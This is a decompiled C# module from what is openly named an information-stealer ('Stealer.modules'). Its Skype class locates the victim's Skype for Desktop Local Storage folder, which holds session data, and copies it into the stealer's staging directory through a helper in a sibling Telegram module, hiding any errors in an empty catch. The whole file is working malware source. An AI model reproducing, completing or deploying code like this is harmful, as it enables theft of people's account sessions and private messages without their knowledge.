using System;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x0200002C RID: 44
	internal class Skype
	{
		// Token: 0x060000DA RID: 218 RVA: 0x0000A51C File Offset: 0x0000871C
		public static void GetSkype()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Skype for Desktop\\Local Storage";
			string text2 = Program.path + "\\Skype\\";
			try
			{
				if (Directory.Exists(text))
				{
					if (!Directory.Exists(text2))
					{
						Directory.CreateDirectory(text2);
					}
					Telegram.CopyAll(text, text2);
				}
			}
			catch
			{
			}
		}
	}
}
